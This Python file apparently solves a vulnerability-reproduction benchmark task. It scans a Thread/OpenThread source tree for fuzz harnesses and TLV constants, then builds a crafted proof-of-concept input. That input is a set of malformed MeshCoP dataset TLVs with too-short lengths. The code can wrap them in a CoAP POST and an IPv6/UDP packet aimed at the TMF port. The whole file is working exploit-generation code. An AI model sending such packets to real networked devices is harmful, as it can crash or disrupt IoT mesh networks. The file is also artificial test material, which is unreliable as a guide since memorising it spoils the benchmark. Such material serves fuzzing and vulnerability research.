import os
import re
import tarfile
from typing import Dict, Iterable, Iterator, List, Optional, Tuple


def _iter_source_texts_from_dir(root: str) -> Iterator[Tuple[str, str]]:
    for base, _, files in os.walk(root):
        for fn in files:
            if not fn.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
                continue
            path = os.path.join(base, fn)
            try:
                st = os.stat(path)
                if st.st_size > 2_000_000:
                    continue
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            try:
                text = data.decode("utf-8", "ignore")
            except Exception:
                continue
            yield path, text


def _iter_source_texts(src_path: str) -> Iterator[Tuple[str, str]]:
    if os.path.isdir(src_path):
        yield from _iter_source_texts_from_dir(src_path)
        return
    try:
        with tarfile.open(src_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isfile():
                    continue
                name = m.name
                if not name.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hh", ".hpp", ".hxx")):
                    continue
                if m.size > 2_000_000:
                    continue
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                try:
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    continue
                yield name, text
    except Exception:
        return


_INT_RE = re.compile(r"(?<![\w])(?:(0x[0-9a-fA-F]+)|([0-9]+))(?![\w])")
_STR_RE = re.compile(r'"([^"\\]*(?:\\.[^"\\]*)*)"')


def _parse_int_literal(token: str) -> Optional[int]:
    token = token.strip()
    m = _INT_RE.search(token)
    if not m:
        return None
    if m.group(1):
        try:
            return int(m.group(1), 16)
        except Exception:
            return None
    try:
        return int(m.group(2), 10)
    except Exception:
        return None


def _find_enum_value(text: str, name: str) -> Optional[int]:
    # Common forms:
    # kActiveTimestamp = 8,
    # kDelayTimer = 10,
    # kDelayTimer = 0x0a,
    pat = re.compile(rf"(?<![\w]){re.escape(name)}(?![\w])\s*=\s*([^,}};\n]+)")
    for m in pat.finditer(text):
        val = _parse_int_literal(m.group(1))
        if val is not None and 0 <= val <= 255:
            return val
    return None


def _find_string_constant(text: str, name: str) -> Optional[str]:
    # Common forms:
    # const char kUriPendingSet[] = "a/sp";
    # constexpr char kUri...[] = "a/sp";
    pat = re.compile(rf"(?<![\w]){re.escape(name)}(?![\w]).*?=\s*({{0,1}})\s*\"")
    m = pat.search(text)
    if not m:
        return None
    start = m.end() - 1
    m2 = _STR_RE.search(text, start)
    if not m2:
        return None
    s = m2.group(1)
    try:
        s = bytes(s, "utf-8").decode("unicode_escape")
    except Exception:
        pass
    s = s.strip()
    if not s:
        return None
    return s


def _encode_coap_option_header(delta: int, length: int) -> bytes:
    def enc_nibble(x: int) -> Tuple[int, bytes]:
        if x < 13:
            return x, b""
        if x < 269:
            return 13, bytes([x - 13])
        return 14, bytes([(x - 269) >> 8, (x - 269) & 0xFF])

    dn, de = enc_nibble(delta)
    ln, le = enc_nibble(length)
    return bytes([(dn << 4) | ln]) + de + le


def _build_coap_post(uri_path: str, payload: bytes) -> bytes:
    uri_path = uri_path.strip()
    if uri_path.startswith("/"):
        uri_path = uri_path[1:]
    if uri_path.endswith("/"):
        uri_path = uri_path[:-1]
    segments = [seg for seg in uri_path.split("/") if seg]

    # CoAP: ver=1, type=CON(0), TKL=0 => 0x40
    # Code=POST => 0x02
    # Message ID = 0x0001
    msg = bytearray(b"\x40\x02\x00\x01")

    prev_opt = 0
    for seg in segments:
        opt_num = 11  # Uri-Path
        delta = opt_num - prev_opt
        seg_b = seg.encode("utf-8", "ignore")
        msg += _encode_coap_option_header(delta, len(seg_b))
        msg += seg_b
        prev_opt = opt_num

    msg += b"\xFF"
    msg += payload
    return bytes(msg)


def _checksum16_ones_complement(data: bytes) -> int:
    if len(data) & 1:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
        s = (s & 0xFFFF) + (s >> 16)
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return (~s) & 0xFFFF


def _build_ipv6_udp_packet(udp_payload: bytes, src_ip: bytes, dst_ip: bytes, src_port: int, dst_port: int) -> bytes:
    udp_len = 8 + len(udp_payload)
    udp = bytearray()
    udp += bytes([(src_port >> 8) & 0xFF, src_port & 0xFF, (dst_port >> 8) & 0xFF, dst_port & 0xFF])
    udp += bytes([(udp_len >> 8) & 0xFF, udp_len & 0xFF])
    udp += b"\x00\x00"  # checksum placeholder
    udp += udp_payload

    pseudo = bytearray()
    pseudo += src_ip
    pseudo += dst_ip
    pseudo += bytes([(udp_len >> 24) & 0xFF, (udp_len >> 16) & 0xFF, (udp_len >> 8) & 0xFF, udp_len & 0xFF])
    pseudo += b"\x00\x00\x00" + b"\x11"  # next header = UDP(17)
    csum = _checksum16_ones_complement(bytes(pseudo) + bytes(udp))
    if csum == 0:
        csum = 0xFFFF
    udp[6] = (csum >> 8) & 0xFF
    udp[7] = csum & 0xFF

    ipv6 = bytearray()
    ipv6 += b"\x60\x00\x00\x00"  # Version 6
    ipv6 += bytes([(udp_len >> 8) & 0xFF, udp_len & 0xFF])  # payload length
    ipv6 += b"\x11"  # next header UDP
    ipv6 += b"\x40"  # hop limit
    ipv6 += src_ip
    ipv6 += dst_ip
    ipv6 += udp
    return bytes(ipv6)


def _detect_fuzzer_mode(files: List[Tuple[str, str]]) -> Tuple[str, Optional[str]]:
    fuzzers: List[Tuple[str, str]] = []
    for path, text in files:
        if "LLVMFuzzerTestOneInput" in text:
            fuzzers.append((path, text))

    if not fuzzers:
        return "tlvs", None

    def score_fuzzer(t: str) -> int:
        kws = [
            "Dataset",
            "otDataset",
            "MeshCoP",
            "ActiveTimestamp",
            "PendingTimestamp",
            "DelayTimer",
            "MGMT",
            "Mgmt",
            "Coap",
            "Tmf",
        ]
        sc = 0
        for kw in kws:
            sc += 5 * t.count(kw)
        return sc

    fuzzers.sort(key=lambda x: (score_fuzzer(x[1]), ("dataset" in x[0].lower()), -len(x[1])), reverse=True)
    fpath, ftext = fuzzers[0]

    lower = ftext.lower()
    mode = "tlvs"
    if "otip6receive" in lower or "ip6::" in ftext or "udp::" in ftext:
        mode = "ipv6"
    elif "coap" in lower:
        mode = "coap"

    # Try to discover which URI is used
    uri_hint = None
    for s in ("kUriPendingSet", "kUriActiveSet", "OPENTHREAD_URI_PENDING_SET", "OPENTHREAD_URI_ACTIVE_SET"):
        if s in ftext:
            uri_hint = s
            break
    if uri_hint is None:
        # Look for literal segments used in Uri-Path options
        # Very heuristic: if "a/sp" or "a/sa" appears, use it
        if "a/sp" in ftext:
            uri_hint = "a/sp"
        elif "a/sa" in ftext:
            uri_hint = "a/sa"
        elif "/sp" in ftext:
            uri_hint = "a/sp"
        elif "/sa" in ftext:
            uri_hint = "a/sa"

    return mode, uri_hint


def _extract_constants(files: List[Tuple[str, str]]) -> Dict[str, int]:
    want = ["kActiveTimestamp", "kPendingTimestamp", "kDelayTimer"]
    found: Dict[str, int] = {}
    for name in want:
        for _, text in files:
            v = _find_enum_value(text, name)
            if v is not None:
                found[name] = v
                break

    # Reasonable fallbacks for Thread MeshCoP Dataset TLVs
    found.setdefault("kActiveTimestamp", 8)
    found.setdefault("kPendingTimestamp", 9)
    found.setdefault("kDelayTimer", 10)
    return found


def _extract_uri(files: List[Tuple[str, str]], prefer_pending: bool, uri_hint: Optional[str]) -> str:
    if uri_hint and "/" in uri_hint and uri_hint[0].isalnum():
        return uri_hint

    pending_names = ["kUriPendingSet", "OPENTHREAD_URI_PENDING_SET"]
    active_names = ["kUriActiveSet", "OPENTHREAD_URI_ACTIVE_SET"]

    def find_any(names: List[str]) -> Optional[str]:
        for nm in names:
            for _, text in files:
                s = _find_string_constant(text, nm)
                if s and "/" in s and len(s) <= 32:
                    return s
        return None

    pending = find_any(pending_names)
    active = find_any(active_names)

    if prefer_pending:
        if pending:
            return pending
        if active:
            return active
    else:
        if active:
            return active
        if pending:
            return pending

    return "a/sp" if prefer_pending else "a/sa"


class Solution:
    def solve(self, src_path: str) -> bytes:
        files = list(_iter_source_texts(src_path))
        consts = _extract_constants(files)
        mode, uri_hint = _detect_fuzzer_mode(files)

        # Malformed TLVs: too-short length (1) for required sizes (8/8/4)
        payload = bytes(
            [
                consts["kActiveTimestamp"],
                1,
                0,
                consts["kPendingTimestamp"],
                1,
                0,
                consts["kDelayTimer"],
                1,
                0,
            ]
        )

        prefer_pending = True
        if uri_hint:
            lh = uri_hint.lower()
            if "active" in lh or lh.endswith("a/sa") or lh.endswith("/sa"):
                prefer_pending = False
            elif "pending" in lh or lh.endswith("a/sp") or lh.endswith("/sp"):
                prefer_pending = True

        if mode == "coap":
            uri = _extract_uri(files, prefer_pending=prefer_pending, uri_hint=uri_hint)
            return _build_coap_post(uri, payload)

        if mode == "ipv6":
            uri = _extract_uri(files, prefer_pending=prefer_pending, uri_hint=uri_hint)
            coap = _build_coap_post(uri, payload)

            # Use multicast destination likely accepted by Thread stack; ports: TMF 61631 (0xF0BF)
            src_ip = bytes.fromhex("fe800000000000000000000000000001")
            dst_ip = bytes.fromhex("ff030000000000000000000000000001")
            port = 61631
            return _build_ipv6_udp_packet(coap, src_ip, dst_ip, port, port)

        return payload